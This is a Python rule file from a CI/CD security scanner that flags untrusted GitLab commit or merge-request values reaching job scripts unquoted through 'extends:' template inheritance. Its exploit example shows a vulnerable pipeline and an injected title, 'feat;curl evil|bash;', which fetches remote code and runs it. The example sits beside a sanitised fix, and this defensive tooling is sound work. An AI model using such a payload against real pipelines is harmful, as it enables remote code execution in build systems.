"""TAINT-008. Untrusted input flows via GitLab ``extends:`` inheritance.

The companion to TAINT-004. Where TAINT-004 follows the
``artifacts.reports.dotenv`` cross-job channel, TAINT-008
follows GitLab's ``extends:`` template-inheritance channel:

  .base:
    variables:
      TITLE: $CI_COMMIT_TITLE        # tainted, declared in a hidden template

  build:
    extends: .base
    script:
      - echo Building $TITLE         # TAINT-008 fires — TITLE is inherited

GL-002 doesn't catch this because it only walks non-hidden
jobs (its ``iter_jobs`` skips names starting with ``.``), so
the tainted ``variables:`` block in ``.base`` is invisible.
TAINT-008 closes that gap by resolving every non-hidden
job's ``extends:`` chain transitively, gathering tainted
``variables:`` from every link in the chain, and walking the
consuming job's scripts for unquoted references to each
inherited tainted name.
"""
from __future__ import annotations

from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from .._taint_graph import analyze_extends_taint

RULE = Rule(
    id="TAINT-008",
    title=(
        "Untrusted input flows via GitLab ``extends:`` template "
        "inheritance"
    ),
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4", "CICD-SEC-1"),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78", "CWE-829"),
    recommendation=(
        "Move the tainted-source interpolation out of the "
        "template's ``variables:`` block. The canonical safe "
        "pattern is to receive the source value through "
        "``$CI_*`` directly in the consuming job's script (or a "
        "dedicated sanitiser step) and never copy it into a "
        "shared variable a downstream job can interpolate "
        "unquoted. If the inheritance is genuinely needed, "
        "sanitise at the boundary (``TITLE_SAFE: '$(echo "
        "\"$CI_COMMIT_TITLE\" | tr -dc \"a-zA-Z0-9 \")'``) and "
        "have the extending job reference the cleaned variable. "
        "Removing the ``extends:`` propagation is the strongest "
        "fix; if the value genuinely needs to flow downstream, "
        "validate the sanitiser is doing what you think before "
        "relying on it."
    ),
    docs_note=(
        "Two-pass walk over the pipeline doc. Pass 1 builds a "
        "universe of every job-shaped entry (hidden templates "
        "included, top-level keywords excluded), resolves each "
        "non-hidden job's ``extends:`` chain transitively, and "
        "gathers tainted variables (any ``$CI_COMMIT_*`` / "
        "``$CI_MERGE_REQUEST_*`` interpolation in the link's "
        "``variables:`` block). Pass 2 walks the consuming "
        "job's ``before_script:`` / ``script:`` / "
        "``after_script:`` for unquoted ``$<name>`` references "
        "matching an inherited tainted variable. Cycles in the "
        "extends chain are broken via a visited set; "
        "unresolvable extends entries are silently dropped.\n\n"
        "v1 limitations: ``include:`` cross-pipeline file "
        "inclusion isn't tracked yet (would need cross-document "
        "analysis like the GHA ``--resolve-remote`` flow). "
        "``extends:`` chains that pull templates from "
        "include-d files are partial: in-doc links resolve, "
        "external links are treated as missing."
    ),
    known_fp=(
        "If the consuming job sanitises the inherited variable "
        "before referencing it (``CLEAN=$(echo \"$TITLE\" | tr "
        "-dc 'a-zA-Z0-9 '); echo $CLEAN``), the rule still "
        "fires on the original ``$TITLE`` reference even though "
        "the sanitised value is what reaches the shell. "
        "Suppress via ignore-file scoped to the consuming job's "
        "name when the sanitiser is audited and load-bearing.",
    ),
    exploit_example=(
        "# Vulnerable: hidden template ``.base`` interpolates\n"
        "# ``$CI_COMMIT_TITLE`` (attacker-controllable via MR\n"
        "# title) into a ``variables:`` block. Job ``build``\n"
        "# extends ``.base`` and references ``$TITLE`` unquoted\n"
        "# in a shell command. A MR titled ``feat;curl\n"
        "# evil|bash;`` executes the injected curl. GL-002\n"
        "# misses this because it skips hidden-job templates.\n"
        ".base:\n"
        "  variables:\n"
        "    TITLE: $CI_COMMIT_TITLE\n"
        "build:\n"
        "  extends: .base\n"
        "  script:\n"
        "    - echo Building $TITLE\n"
        "    - ./generate-notes --title $TITLE\n"
        "\n"
        "# Safe: receive the source value at the consumer (not\n"
        "# the template), sanitise it once, and reference the\n"
        "# cleaned variable quoted from then on. The hidden\n"
        "# template no longer carries any attacker-controllable\n"
        "# variable.\n"
        ".base:\n"
        "  before_script:\n"
        "    - echo \"Job $CI_JOB_NAME starting\"\n"
        "build:\n"
        "  extends: .base\n"
        "  script:\n"
        "    - clean=$(echo \"$CI_COMMIT_TITLE\" | tr -dc 'a-zA-Z0-9 -')\n"
        "    - echo \"Building $clean\"\n"
        "    - ./generate-notes --title \"$clean\""
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    paths = analyze_extends_taint(doc)
    if not paths:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description=(
                "No tainted variable inherited via ``extends:`` "
                "and consumed unquoted in a job script."
            ),
            recommendation=RULE.recommendation, passed=True,
        )
    rendered = [p.render() for p in paths]
    desc = (
        f"{len(paths)} extends-inheritance taint path(s) reach a "
        f"job script: {'; '.join(rendered[:3])}"
        f"{'...' if len(rendered) > 3 else ''}."
    )
    # Sink-side consumer jobs. Same ``<job>:script[<idx>]`` shape as
    # TAINT-004. ``rsplit`` on the trailing ``":"`` preserves job
    # names that legitimately contain ``":"`` (e.g. ``deploy:prod``)
    # while shedding the trailing sink suffix. AC-022's reachability-
    # aware matcher unions these with the producer-side GL-002
    # anchors and intersects against GL-004's ungated-deploy set, so
    # an extends-chain hop into a deploy job confirms an end-to-end
    # path.
    anchor_jobs: dict[str, None] = {}
    for p in paths:
        anchor_jobs[p.sink_location.rsplit(":", 1)[0]] = None
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=False,
        job_anchors=tuple(anchor_jobs),
        path_evidence=tuple(rendered),
    )
